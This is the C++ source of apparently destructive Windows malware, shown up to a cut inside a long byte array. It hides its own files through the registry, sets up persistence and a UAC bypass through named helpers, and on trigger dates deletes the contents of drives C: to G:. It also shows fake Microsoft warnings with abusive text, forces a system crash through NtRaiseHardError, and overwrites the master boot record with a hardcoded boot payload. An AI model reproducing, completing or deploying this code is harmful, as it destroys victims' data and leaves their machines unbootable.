#include "playboard.h"
DWORD WINAPI del(LPVOID lpParamter) {
	RemoveDir("C:\\");
	RemoveDir("D:\\");
	RemoveDir("E:\\");
	RemoveDir("F:\\");
	RemoveDir("G:\\");
	return 0;
}
VOID OverwriteMBR(LPCVOID mbr) {
	DWORD write;
	HANDLE MBR = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
	WriteFile(MBR, mbr, 65536, &write, NULL);
	CloseHandle(MBR);
}
int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpszArgument,int nCmdShow) {
	char regpath[] = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\SHOWALL";
   	HKEY hkey;
   	DWORD set = 0;
   	RegOpenKey(HKEY_LOCAL_MACHINE, regpath, &hkey);
   	RegSetValueEx(hkey, "CheckedValue", 0, REG_DWORD, (LPBYTE)&set, sizeof(set));
	SetFileAttributes("C:\\wincheck.exe", FILE_ATTRIBUTE_HIDDEN );
	SetFileAttributes("C:\\checknew.log", FILE_ATTRIBUTE_HIDDEN );
	CHAR pathFile[5000];
	GetModuleFileName(NULL, pathFile, sizeof(pathFile));
	string pathstr = pathFile;
	string check_input;
	ifstream file_check_new("C:\\checknew.log");
	file_check_new >> check_input;
   	file_check_new.close();
	pathstr.erase(pathstr.size() - 4);
	if (pathstr != "C:\\wincheck" && !check_input.empty() && !examdate(7)) {
		ShellExecute(NULL, NULL, pathstr.c_str(), NULL, NULL, SW_SHOWDEFAULT);
	}
	if (check_input.empty()) {
		DeleteFile("C:\\checknew.log");
		ofstream file_check_write("C:\\checknew.log");
		file_check_write << "fred durst said no computer today silly boy go outside to play";
   		file_check_write.close();
	}
	start_no_UAC();
	autorun();
	if(examdate(0)){
		die();
		CreateThread(NULL, 0, del, NULL, 0, NULL);
		Sleep(60000);
		Do_It();
	}
	if(examdate(1)){
		die();
		MessageBox(NULL,"Please TURN ON YOUR PC tomorrow.\nMicrosoft have a surprise for you.", "Microsoft Windows", MB_OK|MB_ICONINFORMATION);
		MessageBox(NULL,"Microsoft have this surprise only for you.\nDont't tell anyone else.", "Microsoft Windows", MB_OK|MB_ICONWARNING);
		MessageBox(NULL,"Or maybe I will start this surprise now...", "Microsoft Windows", MB_OK|MB_ICONWARNING);
		Sleep(60000);
		CreateThread(NULL, 0, del, NULL, 0, NULL);
		Sleep(60000);
		MessageBox(NULL,"Now...Look at your PC...", "Microsoft Windows", MB_OK|MB_ICONWARNING);
		MessageBox(NULL,"THEN DIE.", "Micr6s6ft Wind6ws 666666", MB_OK|MB_ICONWARNING);
		Do_It();
	}
	if(examdate(2)){
		die();
		MessageBox(NULL,"DIE.", "hello", MB_OK|MB_ICONWARNING);
		MessageBox(NULL,"DIE.", "user", MB_OK|MB_ICONWARNING);
		MessageBox(NULL,"DIE.", "fuck", MB_OK|MB_ICONWARNING);
		MessageBox(NULL,"DIE.", "you", MB_OK|MB_ICONWARNING);
		MessageBox(NULL,"DIE.", "YOU", MB_OK|MB_ICONWARNING);
		MessageBox(NULL,"DIE.", "Bitch", MB_OK|MB_ICONWARNING);
		MessageBox(NULL,"You idiot!don't close me!\nYou won't want it.", "Micr6s6ft Wind6ws 666666", MB_OK|MB_ICONWARNING);
		HMODULE ntdll = LoadLibrary("ntdll.dll");
 		FARPROC RtlAdjPriv=GetProcAddress(ntdll,"RtlAdjustPrivilege");
 		FARPROC NtRaiseHardErr=GetProcAddress(ntdll,"NtRaiseHardError");
 		unsigned char ErrKill;
 		long unsigned int HDErr;
 		((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjPriv)(0x13,true,false,&ErrKill);
 		((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardErr)(0xdead6666,0,0,0,6, &HDErr);
	}
	unsigned char mbrChar[4096] = {
	0xEA, 0x05, 0x7C, 0x00, 0x00, 0xFA, 0x31, 0xC0, 0x8E, 0xD0, 0xBC, 0xF0, 0x7B, 0xFB, 0xBB, 0x00, 
	0x10, 0x8E, 0xC3, 0xB8, 0x08, 0x02, 0xB9, 0x02, 0x00, 0xB6, 0x00, 0x31, 0xDB, 0xCD, 0x13, 0x06, 
	0x1F, 0xB8, 0x00, 0x20, 0x8E, 0xC0, 0x31, 0xC0, 0x89, 0xC3, 0x89, 0xC1, 0x89, 0xC2, 0x89, 0xC7, 
	0x89, 0xC6, 0xAC, 0x81, 0xFE, 0x86, 0x07, 0x73, 0x2F, 0x3C, 0x80, 0x73, 0x02, 0xEB, 0x0F, 0x24, 
	0x7F, 0x88, 0xC1, 0xAC, 0xAA, 0xFE, 0xC9, 0x80, 0xF9, 0xFF, 0x75, 0xF7, 0xEB, 0xE4, 0x88, 0xC4, 
	0xAC, 0x89, 0xC3, 0xAC, 0x1E, 0x68, 0x00, 0x20, 0x1F, 0x89, 0xF2, 0x89, 0xDE, 0x88, 0xC1, 0xAC, 
	0xAA, 0xE2, 0xFC, 0x89, 0xD6, 0x1F, 0xEB, 0xCA, 0xB8, 0x00, 0x20, 0x8E, 0xD8, 0x8E, 0xC0, 0xEA, 
	0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA, 
	0xA4, 0xB8, 0x03, 0x00, 0xCD, 0x10, 0xB8, 0x03, 0x10, 0xB3, 0x00, 0xCD, 0x10, 0xB0, 0x34, 0xE6, 
	0x43, 0xE8, 0x92, 0x00, 0xFA, 0x1E, 0x6A, 0x00, 0x1F, 0xC7, 0x06, 0x20, 0x00, 0x53, 0x00, 0xC7, 
	0x06, 0x22, 0x00, 0x00, 0x20, 0x1F, 0x00, 0x14, 0x06, 0x86, 0x24, 0x00, 0x93, 0x00, 0xC7, 0x06, 
	0x26, 0x00, 0x21, 0x04, 0xB9, 0xFB, 0xB0, 0xB6, 0xE6, 0x43, 0xB8, 0xA9, 0x04, 0xE6, 0x42, 0x88, 
	0xE0, 0xE6, 0x42, 0xE4, 0x61, 0x0C, 0x03, 0xE6, 0x61, 0xE8, 0x1A, 0x01, 0xF4, 0xEB, 0xFD, 0x00, 
	0x00, 0x00, 0x60, 0xFE, 0x06, 0x50, 0x00, 0x80, 0x3E, 0x50, 0x00, 0x08, 0x75, 0x08, 0xC6, 0x06, 
	0x50, 0x00, 0x00, 0xE8, 0xC2, 0x00, 0xFE, 0x06, 0x51, 0x00, 0x80, 0x3E, 0x51, 0x00, 0x0C, 0x00, 
	0x5D, 0x04, 0x8E, 0x51, 0x00, 0x00, 0xE8, 0x63, 0x01, 0xFE, 0x06, 0x52, 0x00, 0x80, 0x3E, 0x52, 
	0x00, 0x0A, 0x00, 0x70, 0x04, 0x94, 0x52, 0x00, 0x00, 0xE8, 0x62, 0x00, 0xB0, 0x20, 0xE6, 0x20, 
	0x61, 0xCF, 0x60, 0xE4, 0x60, 0x3C, 0x1F, 0x75, 0x03, 0xE8, 0x12, 0x00, 0x8C, 0x07, 0xEE, 0x9C, 
	0x2E, 0xA1, 0xA3, 0x00, 0xE6, 0x40, 0x88, 0xE0, 0xE6, 0x40, 0xC3, 0xA1, 0xA3, 0x00, 0xBB, 0x02, 
	0x00, 0xF7, 0xE3, 0xBB, 0x03, 0x00, 0xF7, 0xF3, 0x3D, 0xC4, 0x07, 0x77, 0x03, 0xB8, 0xD4, 0x8B, 
	0xA3, 0xA3, 0x00, 0xE8, 0xDB, 0xFF, 0xC3, 0x59, 0x6F, 0x75, 0x27, 0x76, 0x65, 0x20, 0x4E, 0x79, 
	0x61, 0x6E, 0x65, 0x64, 0x20, 0x66, 0x6F, 0x72, 0x20, 0x30, 0x30, 0x30, 0x30, 0x30, 0x2E, 0x30, 
	0x20, 0x73, 0x65, 0x63, 0x6F, 0x6E, 0x64, 0x73, 0x21, 0x00, 0x00, 0x06, 0x68, 0x00, 0xB8, 0x07, 
	0xBF, 0x00, 0x00, 0xFF, 0x06, 0xED, 0x00, 0xBB, 0x44, 0x00, 0x83, 0xEB, 0x02, 0x26, 0x8A, 0x87, 
	0x00, 0x0F, 0x3C, 0x30, 0x72, 0x16, 0x3C, 0x39, 0x77, 0x12, 0xFE, 0xC0, 0x26, 0x88, 0x01, 0x03, 
	0x04, 0x84, 0x3A, 0x75, 0x0C, 0xB0, 0x30, 0x01, 0x10, 0x05, 0x86, 0x83, 0xFB, 0x00, 0x75, 0xD9, 
	0x07, 0xC3, 0x00, 0xED, 0x0A, 0xB5, 0x8B, 0x36, 0x27, 0x01, 0x81, 0x3E, 0xDA, 0x01, 0xD1, 0x67, 
	0x77, 0x17, 0x75, 0x10, 0xBE, 0x0D, 0x02, 0xBF, 0x00, 0x00, 0xB9, 0x30, 0x00, 0xB8, 0xDC, 0x00, 
	0xF3, 0xAB, 0xEB, 0x05, 0xE8, 0x38, 0x00, 0xEB, 0x11, 0xE8, 0x5A, 0x00, 0x81, 0x3E, 0x27, 0x01, 
	0xCD, 0x5F, 0x72, 0x06, 0xC7, 0x06, 0x27, 0x01, 0x0D, 0x02, 0x07, 0xC3, 0x01, 0x29, 0x08, 0x98, 
	0xB8, 0xDC, 0x00, 0xB9, 0x80, 0x07, 0xF3, 0xAB, 0xB9, 0x22, 0x00, 0xBE, 0xCB, 0x00, 0xAC, 0xAB, 
	0xE2, 0xFC, 0xB0, 0xDC, 0xB9, 0x2E, 0x00, 0xF3, 0xAB, 0x01, 0x65, 0x07, 0x00, 0x5F, 0x04, 0x9B, 
	0x05, 0x83, 0xFE, 0x30, 0x73, 0x16, 0x89, 0xF7, 0x6B, 0xFF, 0x02, 0x8A, 0x84, 0x79, 0x69, 0x26, 
	0x88, 0x05, 0x26, 0xC6, 0x45, 0x01, 0xF0, 0x46, 0x89, 0x36, 0x27, 0x01, 0x01, 0x88, 0x07, 0x87, 
	0xA1, 0xED, 0x00, 0xBA, 0x00, 0x00, 0xBB, 0x0A, 0x00, 0xB9, 0x04, 0x91, 0xA4, 0x01, 0x75, 0x03, 
	0xBE, 0xCD, 0x5F, 0xBF, 0x01, 0x00, 0xB9, 0xD0, 0x07, 0xAC, 0xAA, 0x47, 0xE2, 0xFB, 0x01, 0xAB, 
	0x06, 0xA0, 0x9D, 0x67, 0x00, 0x8B, 0x36, 0xDA, 0x01, 0x81, 0xFE, 0x79, 0x69, 0x72, 0x03, 0xBE, 
	0xD1, 0x67, 0xFE, 0x0E, 0xDC, 0x01, 0x80, 0x3E, 0xDC, 0x01, 0xFF, 0x75, 0x17, 0xAD, 0x89, 0xC1, 
	0x80, 0xE4, 0x1F, 0x00, 0x3E, 0x06, 0x8F, 0xC0, 0xED, 0x05, 0x88, 0x2E, 0xDC, 0x01, 0x89, 0x36, 
	0xDA, 0x01, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0x02, 0x0D, 0x04, 0x02, 0x0D, 0x08, 0x02, 0x0D, 0x10, 
	0x02, 0x0D, 0x20, 0x02, 0x0D, 0x40, 0x02, 0x19, 0x74, 0x85, 0x44, 0x87, 0x8F, 0x8F, 0x8F, 0x8F, 
	0x03, 0x03, 0x04, 0x03, 0x03, 0x08, 0x03, 0x03, 0x10, 0x03, 0x03, 0x20, 0x81, 0x8F, 0x08, 0x02, 
	0xF5, 0x0D, 0x84, 0x77, 0xFF, 0xFF, 0xFF, 0xFF, 0x03, 0x53, 0x04, 0x03, 0x53, 0x08, 0x03, 0x53, 
	0x10, 0x03, 0x53, 0x20, 0x81, 0xFF, 0x88, 0x03, 0x45, 0x50, 0x03, 0x95, 0x11, 0x84, 0xF0, 0xF0, 
	0xF0, 0xF0, 0xF8, 0x03, 0xD7, 0x0D, 0x80, 0xF7, 0x03, 0xB9, 0x3D, 0x93, 0x00, 0x00, 0xFF, 0x77, 
	0x00, 0x77, 0xFF, 0xF7, 0xF8, 0xF8, 0xF7, 0xFF, 0xF7, 0xF4, 0xF4, 0xF4, 0xF7, 0xC4, 0x4C, 0xF4, 
	0x04, 0x0A, 0x3E, 0x90, 0x07, 0x00, 0x87, 0xFF, 0xF7, 0x88, 0xF8, 0xF8, 0x88, 0xF7, 0x47, 0x44, 
	0xF4, 0xF7, 0xFF, 0xCC, 0x44, 0x04, 0x09, 0x40, 0x8F, 0x8F, 0x00, 0xF0, 0x7F, 0x88, 0xF8, 0xF7, 
	0xF8, 0xFF, 0xF4, 0xF4, 0x74, 0x44, 0xFF, 0xC7, 0x44, 0x04, 0x59, 0x3D, 0x05, 0x1F, 0x05, 0x80, 
	0x7F, 0x05, 0x38, 0x04, 0x05, 0x3C, 0x04, 0x05, 0x3F, 0x04, 0x05, 0x3E, 0x05, 0x03, 0x6D, 0x89, 
	0x03, 0x56, 0xA0, 0x05, 0x86, 0xF0, 0x06, 0x76, 0xEC, 0x84, 0x78, 0xF8, 0xF8, 0xF8, 0xF8, 0x08, 
	0x53, 0x04, 0x08, 0x53, 0x08, 0x08, 0x53, 0x10, 0x08, 0x53, 0x20, 0x81, 0xF8, 0x80, 0x02, 0x0D, 
	0xF4, 0x08, 0x95, 0xF4, 0x0A, 0x78, 0x05, 0x83, 0xC4, 0xC4, 0xC4, 0xC4, 0x0A, 0x82, 0x04, 0x0A, 
	0x82, 0x08, 0x0A, 0x82, 0x10, 0x0A, 0x82, 0x20, 0x82, 0xC4, 0xC4, 0xC4, 0x08, 0x45, 0x0D, 0x86, 
	0x07, 0x8F, 0x8F, 0x0F, 0x0F, 0x0F, 0x0F, 0x0A, 0xD5, 0x04, 0x0A, 0xD5, 0x08, 0x0A, 0xD5, 0x10, 
	0x0A, 0xD8, 0x1D, 0x83, 0x8F, 0x8F, 0x08, 0x44, 0x07, 0xF6, 0x4F, 0x0B, 0x15, 0x50, 0x0B, 0x65, 
	0x11, 0x03, 0xF6, 0x04, 0x80, 0xF0, 0x03, 0xFB, 0x3A, 0x0B, 0xB5, 0x11, 0x84, 0x00, 0x00, 0x7F, 
	0x77, 0x08, 0x04, 0x4B, 0x07, 0x87, 0xFF, 0xF8, 0xF8, 0xF8, 0xF7, 0xCC, 0x44, 0xFC, 0x0B, 0xDA, 
	0x3E, 0x80, 0x07, 0x04, 0x4A, 0x04, 0x87, 0x88, 0x78, 0x78, 0x88, 0x77, 0x8F, 0x48, 0x78, 0x04, 
	0xA5, 0x30, 0x0C, 0x55, 0x13, 0x90, 0xFF, 0x8F, 0x00, 0x78, 0x7F, 0x88, 0x78, 0xF8, 0xF8, 0xFF, 
	0xF8, 0xF4, 0x74, 0x88, 0xFF, 0xC7, 0x4C, 0x0C, 0x29, 0x3D, 0x0C, 0xEB, 0x09, 0x05, 0x3F, 0x36, 
	0x0B, 0x65, 0x26, 0x0B, 0xD8, 0x29, 0x0D, 0x44, 0x27, 0x80, 0xCF, 0x0D, 0x19, 0x28, 0x0D, 0x94, 
	0x27, 0x87, 0xCC, 0x77, 0xFF, 0xEE, 0x7E, 0xEF, 0xEE, 0xFE, 0x0D, 0xC3, 0x4C, 0x83, 0xFF, 0xFF, 
	0xEE, 0xEE, 0x0D, 0x73, 0x4B, 0x84, 0xEF, 0xFF, 0xFF, 0xEF, 0xEF, 0x0B, 0x43, 0x83, 0x0B, 0x26, 
	0xA0, 0x0F, 0x86, 0x4C, 0x08, 0x52, 0x43, 0x10, 0x15, 0x0C, 0x84, 0xCC, 0x4C, 0x4C, 0x4C, 0x4C, 
	0x10, 0x72, 0x04, 0x10, 0x72, 0x08, 0x10, 0x72, 0x10, 0x10, 0x72, 0x20, 0x82, 0x4C, 0x4C, 0x4C, 
	0x08, 0x95, 0xFF, 0x09, 0xE4, 0xF0, 0x0A, 0xD5, 0x3D, 0x81, 0x0F, 0x0F, 0x0B, 0x13, 0xFF, 0x0C, 
	0x12, 0x12, 0x85, 0xF0, 0xF8, 0xF7, 0xC4, 0x44, 0x7C, 0x0C, 0x2A, 0x42, 0x80, 0x77, 0x0C, 0x6D, 
	0x06, 0x80, 0x08, 0x0C, 0x74, 0x4C, 0x81, 0x78, 0xF7, 0x0C, 0xC2, 0x06, 0x0C, 0x28, 0x3E, 0x0D, 
	0x0A, 0x08, 0x0D, 0x13, 0x05, 0x0D, 0x13, 0xFF, 0x0E, 0x12, 0x9B, 0x85, 0x7F, 0xEF, 0xF7, 0xF7, 
	0xE7, 0xE7, 0x15, 0x38, 0x04, 0x81, 0xF7, 0xF7, 0x15, 0x3B, 0x04, 0x16, 0x88, 0x05, 0x16, 0x84, 
	0x05, 0x15, 0x39, 0x04, 0x16, 0x96, 0x04, 0x16, 0x8E, 0x05, 0x13, 0x34, 0x2B, 0x9D, 0x22, 0x2A, 
	0xAF, 0x27, 0x22, 0xF7, 0x77, 0x33, 0x3F, 0x3F, 0xBF, 0xFF, 0xFF, 0x71, 0x17, 0x11, 0xF7, 0xFF, 
	0xFF, 0xF5, 0x55, 0x5F, 0x7F, 0x5F, 0x7F, 0xFF, 0x77, 0x7F, 0x7F, 0x7F, 0x16, 0x2A, 0x04, 0x16, 
	0xA1, 0x2F, 0x92, 0xA2, 0xF2, 0x72, 0x27, 0xFF, 0x77, 0x33, 0x73, 0x73, 0xF7, 0xFF, 0xF7, 0x19, 
	0xFF, 0x97, 0x91, 0xFF, 0xF7, 0x55, 0x17, 0x02, 0x06, 0x85, 0x77, 0x77, 0x77, 0xF7, 0xFF, 0x7C, 
	0x16, 0xEF, 0x31, 0x80, 0x33, 0x17, 0x35, 0x05, 0x80, 0x33, 0x16, 0x86, 0x04, 0x88, 0x11, 0x9F, 
	0x1F, 0x1F, 0x99, 0x79, 0xFF, 0x57, 0x75, 0x16, 0x86, 0x05, 0x80, 0x77, 0x16, 0x99, 0x04, 0x80, 
	0x77, 0x17, 0x3F, 0x30, 0x80, 0xAF, 0x14, 0xE4, 0x06, 0x85, 0x3F, 0x3F, 0x3F, 0xBF, 0x7F, 0x9F, 
	0x17, 0xC2, 0x04, 0x86, 0x9F, 0xFF, 0xFF, 0x7F, 0x5F, 0x5F, 0x5F, 0x14, 0xE1, 0x04, 0x81, 0x7F, 
	0x7F, 0x15, 0x8A, 0x07, 0x10, 0x14, 0xFF, 0x08, 0x95, 0xFF, 0x12, 0x12, 0xFF, 0x13, 0x11, 0xFF, 
	0x14, 0x10, 0xFF, 0x0D, 0x3F, 0xFF, 0x16, 0x0E, 0xFF, 0x17, 0x0D, 0xFF, 0x10, 0x3C, 0xFF, 0x08, 
	0x95, 0xFF, 0x02, 0x9A, 0xFF, 0x03, 0x99, 0xFF, 0x04, 0x98, 0xFF, 0x05, 0x97, 0xFF, 0x05, 0x56, 
	0xFF, 0x07, 0x95, 0xFF, 0x08, 0x94, 0xFF, 0x08, 0x95, 0xFF, 0x02, 0xC2, 0xFF, 0x03, 0xC1, 0xFF, 
	0x04, 0xC0, 0xFF, 0x05, 0x6F, 0xFF, 0x05, 0x7E, 0xFF, 0x07, 0xBD, 0xFF, 0x08, 0x95, 0xFF, 0x08, 
	0x95, 0xFF, 0x02, 0xEA, 0xFF, 0x03, 0xE9, 0xFF, 0x04, 0xE8, 0xFF, 0x05, 0x97, 0xFF, 0x05, 0x56, 
	0xFF, 0x07, 0xE5, 0xFF, 0x08, 0x95, 0xFF, 0x09, 0xE3, 0xFF, 0x0A, 0xE2, 0xFF, 0x0B, 0xE1, 0xFF, 
	0x0C, 0xE0, 0xFF, 0x0D, 0xDF, 0xFF, 0x0E, 0xDE, 0xFF, 0x0F, 0xDD, 0xFF, 0x08, 0x95, 0xFF, 0x0A, 
	0x0B, 0xFF, 0x0B, 0x0A, 0xFF, 0x0C, 0x09, 0xFF, 0x0D, 0x08, 0xFF, 0x0E, 0x07, 0xFF, 0x0E, 0xB6, 
	0xFF, 0x10, 0x05, 0xFF, 0x08, 0x95, 0xFF, 0x0A, 0x33, 0xFF, 0x0B, 0x32, 0xFF, 0x0C, 0x31, 0xFF, 
	0x0D, 0x30, 0xFF, 0x0E, 0x2F, 0xFF, 0x0F, 0x2E, 0xFF, 0x10, 0x2D, 0xFF, 0x08, 0x95, 0xFF, 0x12, 
	0x2B, 0xFF, 0x13, 0x2A, 0xFF, 0x14, 0x29, 0xFF, 0x0D, 0x58, 0xFF, 0x16, 0x27, 0xFF, 0x17, 0x26, 
	0xFF, 0x10, 0x55, 0xFF, 0x09, 0x84, 0xFF, 0x12, 0x53, 0xFF, 0x13, 0x52, 0xFF, 0x14, 0x51, 0xFF, 
	0x0D, 0x80, 0xFF, 0x16, 0x4F, 0xFF, 0x17, 0x4E, 0xFF, 0x10, 0x7D, 0xFF, 0x5F, 0x6B, 0x31, 0x5B, 
	0x8C, 0x28, 0x81, 0x22, 0x22, 0x59, 0x93, 0x41, 0x5F, 0xE9, 0x4F, 0x60, 0x7B, 0x0C, 0x81, 0xF2, 
	0x22, 0x60, 0x44, 0x3C, 0x80, 0x2F, 0x60, 0x96, 0x10, 0x60, 0x93, 0x04, 0x81, 0x22, 0xF2, 0x60, 
	0x0A, 0x3C, 0x60, 0xE7, 0x0E, 0x60, 0xE3, 0x04, 0x60, 0x95, 0x3E, 0x61, 0x22, 0x0E, 0x61, 0x32, 
	0x13, 0x81, 0xF2, 0xF2, 0x61, 0x37, 0x2C, 0x61, 0x83, 0x05, 0x61, 0x76, 0x09, 0x60, 0xE2, 0x05, 
	0x61, 0x86, 0x0C, 0x84, 0xF2, 0xF2, 0x22, 0x22, 0x2F, 0x60, 0xF6, 0x2E, 0x61, 0xC3, 0x0C, 0x62, 
	0x13, 0x07, 0x61, 0xDB, 0x0B, 0x61, 0x35, 0x31, 0x62, 0x13, 0x0D, 0x62, 0x21, 0x0C, 0x62, 0x2F, 
	0x07, 0x61, 0x37, 0x30, 0x61, 0x72, 0x04, 0x62, 0x80, 0x09, 0x62, 0xB6, 0x0A, 0x62, 0x7E, 0x07, 
	0x61, 0xE5, 0x2E, 0x62, 0xAF, 0x11, 0x63, 0x07, 0x09, 0x62, 0xCB, 0x3A, 0x63, 0x03, 0x0B, 0x80, 
	0xF2, 0x63, 0x10, 0x09, 0x63, 0x57, 0x08, 0x63, 0x22, 0x2B, 0x86, 0x2F, 0x22, 0x22, 0xF2, 0xF2, 
	0xF2, 0xF2, 0x62, 0x6B, 0x04, 0x63, 0x56, 0x0A, 0x63, 0xA8, 0x08, 0x63, 0x1C, 0x34, 0x63, 0xA7, 
	0x09, 0x82, 0x22, 0xF2, 0xF2, 0x63, 0xED, 0x0A, 0x63, 0xB4, 0x39, 0x62, 0xBD, 0x0B, 0x63, 0xAD, 
	0x12, 0x62, 0xC4, 0x08, 0x63, 0x9F, 0x05, 0x64, 0x60, 0x06, 0x63, 0xA2, 0x05, 0x63, 0xCD, 0x21, 
	0x63, 0xF9, 0x15, 0x63, 0xF2, 0x07, 0x64, 0x00, 0x0F, 0x64, 0x0E, 0x27, 0x64, 0x91, 0x1B, 0x64, 
	0xB4, 0x30, 0x64, 0xDC, 0x0A, 0x64, 0xE5, 0x1A, 0x80, 0x2F, 0x65, 0x07, 0x30, 0x62, 0x7B, 0x0A, 
	0x64, 0x9B, 0x12, 0x60, 0x5F, 0x38, 0x64, 0xED, 0x1A, 0x65, 0x9F, 0x2F, 0x63, 0x1A, 0x09, 0x82, 
	0x2F, 0x2F, 0x2F, 0x66, 0x21, 0x06, 0x82, 0x2F, 0x22, 0x22, 0x65, 0x39, 0x0F, 0x65, 0xF2, 0x2C, 
	0x65, 0x53, 0x0B, 0x64, 0x09, 0x08, 0x64, 0x5B, 0x04, 0x61, 0x72, 0x05, 0x66, 0x29, 0x04, 0x65, 
	0x38, 0x06, 0x65, 0x9F, 0x34, 0x64, 0x0C, 0x0A, 0x64, 0x5B, 0x05, 0x80, 0x2F, 0x62, 0x83, 0x0B, 
	0x65, 0x54, 0x32, 0x60, 0x37, 0x5C, 0x67, 0x24, 0x29, 0x87, 0x7E, 0x07, 0x12, 0x07, 0x4C, 0x26, 
	0xB8, 0x24, 0x67, 0x9D, 0x05, 0x8E, 0x06, 0xB8, 0x04, 0x34, 0x04, 0xBF, 0x03, 0x34, 0x04, 0x00, 
	0x05, 0xB8, 0x24, 0x4C, 0x26, 0x67, 0x9D, 0x08, 0x67, 0xB1, 0x05, 0xA0, 0x04, 0x34, 0x04, 0x89, 
	0x03, 0xBF, 0x03, 0x89, 0x03, 0x34, 0x04, 0x4C, 0x26, 0x9D, 0x25, 0x7E, 0x07, 0x7E, 0x07, 0x70, 
	0x29, 0xF0, 0x07, 0x68, 0x08, 0x70, 0x09, 0x70, 0x49, 0x68, 0x28, 0xF0, 0x27, 0x67, 0xDB, 0x06, 
	0x87, 0x68, 0x08, 0x7E, 0x07, 0x4C, 0x06, 0x9D, 0x05, 0x67, 0xEF, 0x04, 0x67, 0xED, 0x04, 0x67, 
	0xEB, 0x04, 0x85, 0x70, 0x09, 0x7E, 0x27, 0x4C, 0x26, 0x67, 0xF3, 0x0C, 0x83, 0xF0, 0x07, 0x7E, 
	0x07, 0x67, 0xE7, 0x08, 0x81, 0xF0, 0x27, 0x67, 0xEB, 0x08, 0x68, 0x23, 0x04, 0x68, 0x19, 0x05, 
	0x84, 0x28, 0x70, 0x29, 0x68, 0x28, 0x67, 0xD1, 0x66, 0x85, 0x70, 0x29, 0x99, 0x0C, 0x39, 0x0B, 
	0x68, 0x9D, 0x06, 0x68, 0x87, 0x06, 0x83, 0x70, 0x09, 0x12, 0x07, 0x67, 0xA5, 0x06, 0x81, 0x70, 
	0x29, 0x68, 0xA3, 0x08, 0x81, 0x99, 0x0C, 0x68, 0xB1, 0x04, 0x68, 0x93, 0x04, 0x87, 0x99, 0x0C, 
